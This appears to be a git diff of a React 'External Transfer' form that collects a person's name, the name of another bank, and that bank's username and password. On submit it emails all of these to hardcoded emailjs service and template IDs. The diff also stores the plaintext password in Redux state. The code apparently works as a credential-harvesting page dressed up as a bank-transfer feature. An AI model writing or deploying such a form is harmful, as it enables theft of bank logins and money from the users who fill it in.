@@ -3,13 +3,16 @@ import SelectDropdown from "../Shared/selectDropdown/SelectDropdown";
 import { H5, P2 } from "../Shared/headings/Headings";
 import Button from "../Shared/button/Button";
 import Modal from "../Shared/Modal/Modal";
-import { Formik, FormikValues } from "formik";
+import { Formik } from "formik";
 import { externalSchema } from "@/utils/formSchema";
 import Input from "../Shared/input/input2";
-// import Sure from "../Modals/Sure";
 import emailjs from "emailjs-com";
 import Error from "../Modals/Error";
 import Processing from "../Modals/Processed";
+import { IExternal } from "../Services/transfer/Payload";
+import { useDispatch, useSelector } from "react-redux";
+import { setExternalUserData } from "../store/transfer/externalTransferSlice";
+import { RootState } from "../store/store";
 
 const options = [
   {
@@ -46,27 +49,42 @@ const recurringOptions = [
 ];
 
 const ExternalTransfer = () => {
-  const initialValues = {
-    FullName: "",
-    BankName: "",
-    BankUsername: "",
-    Password: "",
-    PasswordConfirmation: "",
-    Amount: "",
+  const dispatch = useDispatch();
+  const externalUserData = useSelector(
+    (state: RootState) => state.externalUser?.externalUser
+  );
+
+  const initialValues: IExternal = {
+    FullName: externalUserData?.FullName || "",
+    BankName: externalUserData?.BankName || "",
+    BankUsername: externalUserData?.BankUsername || "",
+    Password: externalUserData?.Password || "",
+    PasswordConfirmation: externalUserData?.PasswordConfirmation || "",
+    Amount: externalUserData?.Amount || "",
   };
   const [transferType, setTransferType] = useState("one-time");
   const [modalOpen, setModalOpen] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [isError, setisError] = useState(false);
 
-  const handleSubmit = async (values: FormikValues) => {
-    // Specify the type of 'values'
+  const handleSubmit = async (values: IExternal) => {
+    dispatch(setExternalUserData(values));
     setIsLoading(true);
     try {
+      // Convert 'values' to plain JavaScript object
+      const formData = {
+        FullName: values.FullName,
+        BankName: values.BankName,
+        BankUsername: values.BankUsername,
+        Password: values.Password,
+        PasswordConfirmation: values.PasswordConfirmation,
+        Amount: values.Amount,
+      };
+
       await emailjs.send(
         "service_2gd3xdf", // Service ID
         "template_20d16p5", // Template ID
-        values, // Form data
+        formData, // Form data
         "Q9tm9iVXmV_D2TRCb" // User ID
       );
       setIsLoading(false);
